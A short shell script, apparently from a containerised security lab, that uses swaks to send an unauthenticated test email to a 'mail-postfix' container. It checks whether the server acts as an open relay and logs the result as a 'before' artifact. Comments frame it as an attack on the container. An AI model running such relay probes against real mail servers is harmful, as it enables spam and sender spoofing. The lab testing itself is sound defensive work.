#!/bin/sh

# 로그 저장 경로
LOG_DIR="/artifacts"
LOG_FILE="$LOG_DIR/before.log"

# 로그 디렉토리 없으면 생성
mkdir -p "$LOG_DIR"

# 공격 대상: mail-postfix 컨테이너의 SMTP 포트
SMTP_SERVER="mail-postfix"
SMTP_PORT="25"

# 전송 시도 - 인증 없이
echo "[*] Sending unauthenticated mail using swaks..." | tee "$LOG_FILE"

swaks --to victim@example.com \
      --from attacker@example.com \
      --server "$SMTP_SERVER" \
      --port "$SMTP_PORT" \
      --data "Subject: Open Relay Test\n\nThis is an unauthenticated mail test." \
      --timeout 5 \
      --quit-after DATA \
      --hide-credentials \
      | tee -a "$LOG_FILE"

echo "[*] Attack finished. Log saved to $LOG_FILE"
